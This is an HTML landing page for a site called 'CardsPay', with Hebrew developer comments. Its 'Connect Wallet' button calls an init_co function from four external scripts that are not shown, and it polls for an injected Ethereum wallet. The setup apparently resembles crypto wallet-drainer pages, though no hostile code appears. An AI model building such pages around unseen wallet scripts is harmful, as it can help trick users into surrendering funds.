<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CardsPay</title>

  <style>
    /* FORCE WHITE */
    html, body {
      margin: 0;
      padding: 0;
      background: #ffffff !important;
      color: #000000 !important;
      font-family: Arial, Helvetica, sans-serif;
    }

    /* HEADER */
    .site-header {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      height: 68px;
      background: #ffffff;
      border-bottom: 1px solid #eaeaea;
      z-index: 1000;
      display: flex;
      align-items: center;
    }

    .header-container {
      max-width: 1200px;
      margin: 0 auto;
      width: 100%;
      padding: 0 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      font-size: 20px;
      color: #1677ff;
    }

    .logo img {
      height: 32px;
      width: auto;
      display: block;
    }

    .nav-links {
      display: flex;
      gap: 26px;
    }

    .nav-links a {
      text-decoration: none;
      color: #333;
      font-size: 15px;
    }

    /* IMPORTANT:
       אנחנו לא מזיזים את .advanced_mode ב-DOM,
       רק "מציירים" אותה בצד ימין של ההדר עם position: fixed
    */
    .advanced_mode {
      position: fixed;
      top: 14px;          /* בתוך ההדר */
      right: 24px;        /* צד ימין */
      z-index: 1001;      /* מעל ההדר */
    }

    /* עיצוב הכפתור המקורי (הוא נשאר אותו כפתור!) */
    .advanced_mode button {
      background: #4f7cff;
      color: #fff;
      border: none;
      padding: 10px 18px;
      border-radius: 999px;
      font-size: 14px;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .advanced_mode button:hover {
      background: #3b68f0;
    }

    /* כדי שהתוכן לא ייכנס מתחת להדר */
    .page-spacer {
      height: 68px;
    }
  </style>
</head>

<body>
  <!-- HEADER VISUAL -->
  <header class="site-header">
    <div class="header-container">
      <div class="logo">
        <img src="./assets/logo.svg" alt="CardsPay"
             onerror="console.error('Logo not found: ./assets/logo.svg')">
        <span>CardsPay</span>
      </div>

      <nav class="nav-links">
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Cards</a>
        <a href="#">Home</a>
      </nav>
    </div>
  </header>

  <div class="page-spacer"></div>

  <hr>

  <!-- ✅ נשאר בדיוק כמו בדוגמה שלך -->
  <div class="advanced_mode">
    <button onclick="init_co()">Connect Wallet</button>
  </div>

  <!-- הסקריפטים שלך - אותו סדר -->
  <script src="./assets/w-modal.js"></script>
  <script src="./assets/w-loader.js"></script>
  <script src="./assets/modules.js"></script>
  <script src="./assets/main.js"></script>

  <!-- אם injected-status לא קיים אצלך, זה עלול לזרוק שגיאה ולעצור JS.
       לכן שמתי בדיקה שמונעת קריסה. -->
  <script>
    setInterval(() => {
      const el = document.getElementById('injected-status');
      if (el) {
        el.innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
      }
    }, 1000);
  </script>
</body>
</html>
